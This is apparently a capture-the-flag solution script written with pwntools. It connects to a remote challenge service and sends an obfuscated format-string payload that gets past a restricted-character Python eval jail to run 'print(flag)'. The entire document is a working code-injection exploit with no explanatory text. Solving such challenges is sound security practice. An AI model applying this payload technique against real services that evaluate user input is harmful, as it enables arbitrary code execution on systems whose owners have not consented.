from pwn import *
__author__ = "polaris"
context.log_level = "debug"
p = remote("canyouguessme.pwni.ng",12349)

data = """print(flag)"""



fstring = ""
for i in range(len(data)):
    fstring+=("%"*(1<<i)+"c")

fstring = "eval('"+fstring+"'"



ddd = ['(',')','a','l']
for d in data:
    if d in ddd:
        fstring+="%%'%c'"%d
    else:
        tmp = "+all(())"*ord(d)
        fstring+="%%(%s)"%tmp
fstring = fstring+")"
print fstring
print len(set(fstring))


p.recvuntil("Input value: ")
p.sendline(fstring)
p.interactive()
